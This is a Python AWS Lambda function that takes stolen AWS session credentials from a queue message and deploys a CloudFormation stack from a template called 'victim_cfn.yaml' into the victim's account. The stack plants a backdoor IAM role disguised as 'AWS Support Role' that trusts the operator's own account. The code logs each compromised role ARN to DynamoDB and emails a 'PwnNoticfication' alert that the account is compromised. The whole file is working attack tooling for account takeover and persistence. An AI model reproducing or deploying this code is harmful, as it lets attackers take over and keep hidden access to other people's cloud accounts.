import boto3
import os
import json
from time import sleep
from random import randint

REGION = os.environ['REGION']
QUEUE_URL = os.environ['QUEUEURL']
CFN_BUCKET = os.environ['CFNBUCKET']
TABLE_NAME = os.environ['TABLENAME']
SNS_ARN = os.environ['SNSARN']

def cfn_client(message):
  cfn = boto3.client(
    'cloudformation', 
      region_name=REGION,
      aws_access_key_id = message['access_key_id'],
      aws_secret_access_key = message['access_key_secret'],
      aws_session_token = message['session_token']                
      )
  return cfn


def check_cfn_events(cfn, role_name, stack_name):
  events = cfn.describe_stack_events(StackName = stack_name)['StackEvents']
  for i, event in enumerate(events):
    if role_name in event['ResourceStatusReason']:
      return True
  return False


def check_cfn(cfn, message, stack_name):
  try:
    status = cfn.describe_stacks(StackName = stack_name)['Stacks'][0]['StackStatus']
    if 'CREATE_COMPLETE' in status or 'UPDATE_COMPLETE' in status:
      write_to_db(message)
      send_email(message)
      return True
    elif 'FAIL' in status:
      if not check_cfn_events(cfn, message['role_name'], stack_name):
        if delete_stack(cfn, message, stack_name):
          check_cfn(cfn, message, stack_name)
        else:
          return False
      else:
        return False
    else:
      sleep(randint(10,15))
      check_cfn(cfn, message, stack_name)
                        
  except Exception as e:
    if 'AccessDenied' in repr(e):
      return False
    else:
      if execute_stack(cfn, message, stack_name):
        sleep(randint(10,15))
        check_cfn(cfn, message, stack_name)
      else:
        return False
      

def delete_stack(cfn, message, stack_name):
  try:
    response = cfn.delete_stack(
      StackName = stack_name
    )
    sleep(randint(10,15))
    return True        
    
  except Exception as e:
    print(f'ERROR DELETING STACK: {e}')


def get_account_id():
  client = boto3.client('sts')
  account_id = client.get_caller_identity()['Account']
  return account_id

def execute_stack(cfn, message, stack_name): 
  account_id = get_account_id()
  try:
    response = cfn.create_stack(
    StackName = stack_name,
    TemplateURL='https://'+CFN_BUCKET+'/victim_cfn.yaml',
    Parameters=[
        {
            'ParameterKey': 'SupportAccount',
            'ParameterValue': account_id
        }
    ],
    Capabilities=[
        'CAPABILITY_IAM',
        'CAPABILITY_NAMED_IAM',
    ],
    OnFailure='DELETE',
    Tags=[
        {
            'Key': 'Name',
            'Value': 'AWS Support Role'
        },
    ]
    )
    role_name = message['role_name']
    return True
    
  except Exception as e:
    if 'AccessDenied' in repr(e):
      print(f'CREATE STACK - ACCESS DENIED: {e}')
      return False
    elif 'AlreadyExistsException' in repr(e):
      if delete_stack(cfn, message, stack_name):
        check_cfn(cfn, message, stack_name)
      else:
        return False 
    else:
      print(f'CREATE STACK - ERROR: {e}')
      return False


def write_to_db(event):
  dynamodb = boto3.client('dynamodb', region_name=REGION)
  dynamodb.put_item(
    TableName=TABLE_NAME,
    Item = {
      'account_id': {'S': event['account_id']},
      'role_arn': {'S': 'arn:aws:iam::' + event['account_id'] + ':role/AwsSupportRole'}
    }
    )
  

def send_email(message):
  sns = boto3.client('sns', region_name=REGION)
  email  = sns.publish(
    TopicArn = SNS_ARN,
    Subject = 'PwnNoticfication: ' + message['account_id'],
    Message = 'Account: ' + message['account_id'] + ' compromised'
    )


def delete_messsage(receipt_handle):
  sqs = boto3.client('sqs', region_name=REGION)
  response = sqs.delete_message(
    QueueUrl = QUEUE_URL,
    ReceiptHandle = receipt_handle
  )


def lambda_handler(event, context):
  for i, record in enumerate(event['Records']):
    message_body = json.loads(record['body'])
    stack_name = 'AwsSupportRole-' + str(message_body['account_id'])
    cfn = cfn_client(message_body)

    if check_cfn(cfn, message_body, stack_name):
      pass

    delete_messsage(record['receiptHandle'])
